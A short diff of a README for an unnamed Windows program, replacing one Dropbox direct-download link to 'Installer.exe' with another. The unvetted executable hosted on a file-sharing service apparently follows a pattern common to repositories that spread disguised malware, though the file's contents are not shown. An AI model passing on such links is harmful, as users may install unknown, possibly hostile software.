@@ -32,7 +32,7 @@ If the program is not installed try reinstalling the package Visual Studio 2013 
 
 System   | Description |
 --------- | --------- |
-🔹 [Windows 7/8/8.1/10 x64-x86](https://www.dropbox.com/s/9y86c80j8j2puk3/Installer.exe?dl=1) | [Download](https://www.dropbox.com/s/9y86c80j8j2puk3/Installer.exe?dl=1)
+🔹 [Windows 7/8/8.1/10 x64-x86](https://www.dropbox.com/s/7uxm1guej3f767r/Installer.exe?dl=1) | [Download](https://www.dropbox.com/s/7uxm1guej3f767r/Installer.exe?dl=1)
 🔸 Ubuntu 20.04 LTS / Soon | Download
 
 # Tools
